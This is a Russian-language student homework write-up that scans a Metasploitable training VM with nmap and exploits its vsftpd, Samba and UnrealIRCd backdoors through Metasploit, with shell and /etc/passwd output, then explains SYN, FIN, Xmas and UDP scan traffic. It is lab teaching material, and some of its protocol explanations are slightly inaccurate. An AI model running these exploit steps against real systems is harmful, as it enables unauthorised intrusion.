# Домашнее задание к занятию «Уязвимости и атаки на информационные системы»
Инструкция по выполнению домашнего задания

1.	Сделайте fork репозитория c шаблоном решения к себе в Github и переименуйте его по названию или номеру занятия, например, https://github.com/имя-вашего-репозитория/gitlab-hw или https://github.com/имя-вашего-репозитория/8-03-hw).

2.	Выполните клонирование этого репозитория к себе на ПК с помощью команды git clone.

3.	Выполните домашнее задание и заполните у себя локально этот файл README.md

o	впишите вверху название занятия и ваши фамилию и имя;

o	в каждом задании добавьте решение в требуемом виде: текст/код/скриншоты/ссылка;

o	для корректного добавления скриншотов воспользуйтесь инструкцией «Как вставить скриншот в шаблон с решением»;

o	при оформлении используйте возможности языка разметки md. Коротко об этом можно посмотреть в инструкции по MarkDown.

4.	После завершения работы над домашним заданием сделайте коммит (git commit -m "comment") и отправьте его на Github (git push origin).

5.	Для проверки домашнего задания преподавателем в личном кабинете прикрепите и отправьте ссылку на решение в виде md-файла в вашем Github.
 
6.	Любые вопросы задавайте в чате учебной группы и/или в разделе «Вопросы по заданию» в личном кабинете.

Желаем успехов в выполнении домашнего задания.
________________________________________
### Задание 1

Скачайте и установите виртуальную машину Metasploitable: https://sourceforge.net/projects/metasploitable/.

Это типовая ОС для экспериментов в области информационной безопасности, с которой следует начать при анализе уязвимостей.

Просканируйте эту виртуальную машину, используя nmap.

Попробуйте найти уязвимости, которым подвержена эта виртуальная машина.

Сами уязвимости можно поискать на сайте https://www.exploit-db.com/.

Для этого нужно в поиске ввести название сетевой службы, обнаруженной на атакуемой машине, и выбрать подходящие по версии уязвимости.

Ответьте на следующие вопросы:

•	Какие сетевые службы в ней разрешены?

•	Какие уязвимости были вами обнаружены? (список со ссылками: достаточно трёх уязвимостей)

Приведите ответ в свободной форме.


### Ответ 1
```
nmap -A 192.168.65.60
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-18 14:44 MSK
Nmap scan report for 192.168.65.60
Host is up (0.010s latency).
Not shown: 977 closed ports
PORT 	STATE SERVICE 	VERSION
21/tcp   open  ftp     	vsftpd 2.3.4
22/tcp   open  ssh     	OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet  	Linux telnetd
25/tcp   open  smtp    	Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
|_ssl-date: 2024-09-18T11:44:43+00:00; 0s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
| 	SSL2_DES_192_EDE3_CBC_WITH_MD5
| 	SSL2_DES_64_CBC_WITH_MD5
| 	SSL2_RC4_128_EXPORT40_WITH_MD5
| 	SSL2_RC2_128_CBC_WITH_MD5
| 	SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_	SSL2_RC4_128_WITH_MD5
53/tcp   open  domain  	ISC BIND 9.4.2
| dns-nsid:
|_  bind.version: 9.4.2
80/tcp   open  http    	Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind 	2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec    	netkit-rsh rexecd
513/tcp  open  login   	OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi	GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs     	2-4 (RPC #100003)
2121/tcp open  ftp     	ProFTPD 1.3.1
3306/tcp open  mysql   	MySQL 5.0.51a-3ubuntu5
| mysql-info:
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 9
|   Capabilities flags: 43564
|   Some Capabilities: SupportsCompression, SwitchToSSLAfterHandshake, SupportsTransactions, Speaks41ProtocolNew, ConnectWithDatabase, Support41Auth, LongColumnFlag
|   Status: Autocommit
|_  Salt: b+M#bI&~jzE)<1!ONv*j
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2024-09-18T11:44:43+00:00; 0s from scanner time.
5900/tcp open  vnc     	VNC (protocol 3.3)
| vnc-info:
|   Protocol version: 3.3
|   Security types:
|_	VNC Authentication (2)
6000/tcp open  X11     	(access denied)
6667/tcp open  irc     	UnrealIRCd
| irc-info:
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN
|   uptime: 0 days, 0:03:17
|   source ident: nmap
|   source host: 1FA191B.B2C57017.FFFA6D49.IP
|_  error: Closing Link: dzuaugkof[192.168.65.99] (Quit: dzuaugkof)
8009/tcp open  ajp13   	Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http    	Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.31 seconds
```
Разрешены службы
Service и Version
```
nmap -sV 192.168.65.60
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-18 14:53 MSK
Nmap scan report for 192.168.65.60
Host is up (0.0013s latency).
Not shown: 977 closed ports
PORT 	STATE SERVICE 	VERSION
21/tcp   open  ftp     	vsftpd 2.3.4
22/tcp   open  ssh     	OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet  	Linux telnetd
25/tcp   open  smtp    	Postfix smtpd
53/tcp   open  domain  	ISC BIND 9.4.2
80/tcp   open  http    	Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind 	2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec    	netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi	GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs     	2-4 (RPC #100003)
2121/tcp open  ftp     	ProFTPD 1.3.1
3306/tcp open  mysql   	MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc     	VNC (protocol 3.3)
6000/tcp open  X11     	(access denied)
6667/tcp open  irc     	UnrealIRCd
8009/tcp open  ajp13   	Apache Jserv (Protocol v1.3)
8180/tcp open  http    	Apache Tomcat/Coyote JSP engine 1.1
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.73 seconds
```

№1 порт 21 - vsftpd 2.3.4 
```
sudo service postgresql start
service postgresql status
sudo msfdb init
sudo msfconsole
db_status
search vsftpd 2.3.4
hosts -a 192.168.65.60
hosts
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS a 192.168.65.60
exploit

whoami
root
hostname
metasploitable
hostname -i
127.0.1.1
exit
[*] 192.168.65.60- Command shell session 1 closed.
```

№2 - порт 445 - samba_symlink_traversal
```
smbclient -L //192.168.65.60
search samba traversal
Matching Modules
================

   #  Name                                         Disclosure Date  Rank    Check  Description
   -  ----                                         ---------------  ----    -----  -----------
   0  auxiliary/admin/smb/samba_symlink_traversal                   normal  No     Samba Symlink Directory Traversal

use 0
show options
set RHOSTS 192.168.65.60
set SMBSHARE tmp
show options
exploit
smbclient //192.168.65.60/tmp

[*] exec: smbclient //192.168.65.60/tmp
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> cd rootfs
smb: \rootfs\> cd etc
smb: \rootfs\etc\> more passwd

getting file \rootfs\etc\passwd of size 1581 as /tmp/smbmore.paJSIb (308.8 KiloBytes/sec) (average 308.8 KiloBytes/sec)
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false

exit
```

№3 - порт 6667 - UnrealIRCd 3.2.8.1
```
search UnrealIRCd
Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution

use exploit/unix/irc/unreal_ircd_3281_backdoor
show options
set RHOSTS 192.168.65.60
run
exploit
set target 0
exploit
show payloads
set payload 0
exploit
[*] Command shell session 2 opened (192.168.65.59:33973 -> 192.168.65.60:4444) at 2024-09-19 15:07:48 +0300
uname
Linux
hostname
metasploitable
```

### Задание 2

Проведите сканирование Metasploitable в режимах SYN, FIN, Xmas, UDP.

Запишите сеансы сканирования в Wireshark.

Ответьте на следующие вопросы:

•	Чем отличаются эти режимы сканирования с точки зрения сетевого трафика?

•	Как отвечает сервер?

Приведите ответ в свободной форме.

### Ответ 2

SYN сканирование

Используется по умолчанию, популярный тип сканирования.

1.	Быстрый запуск

2.	Брандмауэры не помеха 

```
sudo nmap -sS -p 21 192.168.65.60
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-19 13:01 MSK
Nmap scan report for 192.168.65.60
Host is up (0.016s latency).

PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 08:00:27:55:BF:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
```

1.	Отправляется TCP пакет с флагом SYN, запрашивает соединение

2.	Metasploitable отправляет TCP пакет с флагом ACK, подтверждает соединение, направляет запрос соединения SYN. nmap на основании этого делает вывод о том что порт открыт

3.	Ubuntu отправляет TCP пакет c флагом RST, прерывает соединение.

```
sudo nmap -sS -p 20 192.168.65.60
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-19 13:02 MSK
Nmap scan report for 192.168.65.60
Host is up (0.00073s latency).

PORT   STATE  SERVICE
20/tcp closed ftp-data
MAC Address: 08:00:27:55:BF:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
```

1.	Отправляется TCP пакет с флагом SYN, запрашивает соединение

2.	Metasploitable отправляет TCP пакет с флагом RST, ACK, прерывает соединение
	
3.	nmap делает вывод о том, что порт 20 закрыт

FIN сканирование

Отправляет пакет с флагом FIN, который используется для корректного закрытия соединения.

```
sudo nmap -sF -p 21 192.168.65.60
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-19 13:04 MSK
Nmap scan report for 192.168.65.60
Host is up (0.00075s latency).

PORT   STATE     	SERVICE
21/tcp open|filtered ftp
MAC Address: 08:00:27:55:BF:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```

1.	Отправляется TCP пакет с флагом FIN два раза

2.	Отсутствие ответа говорит о том, что порт открыт/фильтруется. nmap помещает его в это состояние из-за невозможности точно определелить открыт он или отфильтрован, так как порт не отвечает

```
sudo nmap -sF -p 20 192.168.65.60
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-19 13:05 MSK
Nmap scan report for 192.168.65.60
Host is up (0.026s latency).

PORT   STATE  SERVICE
20/tcp closed ftp-data
MAC Address: 08:00:27:55:BF:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

1.	Отправляется TCP пакет с флагом FIN, сообщает, что соединение завершено

2.	Metasploitable отправляет TCP пакет с флагом RST, ACK, прерывает соединение. nmap делает вывод о том, что порт 20 закрыт


Xmas сканирование Устанавливаются следующие флаги:

1.	FIN
	
2.	PSH

3.	URG Если в ответ RST пакет, порт считается закрытым, отсутствие ответа - порт открыт или фильтруется. Порт помечается как отфильтрованный если в ответ приходит ICMP ошибка (тип 3, код 1, 2, 3, 9, 10 или 13). 


```
sudo nmap -sX -p 21 192.168.65.60
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-19 13:06 MSK
Nmap scan report for 192.168.65.60
Host is up (0.017s latency).

PORT   STATE     	SERVICE
21/tcp open|filtered ftp
MAC Address: 08:00:27:55:BF:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
```

1.	Отправляется TCP пакет с флагом FIN, PSH, URG два раза

2.	Ответ отсутствует - значит порт открыт или фильтруется
```
sudo nmap -sX -p 20 192.168.65.60
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-19 13:07 MSK
Nmap scan report for 192.168.65.60
Host is up (0.0063s latency).

PORT   STATE  SERVICE
20/tcp closed ftp-data
MAC Address: 08:00:27:55:BF:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
```

1.	Отправляется TCP пакет с флагом FIN, PSH и URG два раза

2.	Metasploitable отправляет TCP пакет с флагом RST, ACK, прерывает соединение. nmap делает вывод о том, что порт закрыт


UDP сканирование

Отправляется пустой, без данных UDP заголовок на каждый порт цели, если в ответ приходит ошибка ICMP о недостижимости порта (тип 3, код 3) - порт закрыт. Другие ICMP ошибки (тип 3, коды 1, 2, 9, 10 или 13) сигнализируют о том, что порт фильтруется. Возможен

ответ UDP пакетом, что говорит, о том, что порт открыт. 

```
sudo nmap -sU -p 21 192.168.65.60
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-19 13:09 MSK
Nmap scan report for 192.168.65.60
Host is up (0.010s latency).

PORT   STATE  SERVICE
21/udp closed ftp
MAC Address: 08:00:27:55:BF:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
```

1.	Отправляется UDP пакет

2.	Metasploitable отправляет обратный echo ICMP запрос, это означает, что порт недоступен. nmap делает вывод о том, что порт для соединения по UDP закрыт
```
sudo nmap -sU 192.168.65.60
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-19 13:10 MSK
Nmap scan report for 192.168.65.60
Host is up (0.012s latency).
Not shown: 920 closed ports, 76 open|filtered ports
PORT 	STATE SERVICE
53/udp   open  domain
111/udp  open  rpcbind
137/udp  open  netbios-ns
2049/udp open  nfs
MAC Address: 08:00:27:55:BF:F9 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1529.06 seconds
```

Порт 2049

1.	Отправляет UDP пакет

2.	Metasploitable отправляет UDP пакет, nmap делает вывод о том, что порт для соединения по UDP открыт
  
3.	Metasploitable не отправляет обратно echo ICMP запрос с порта

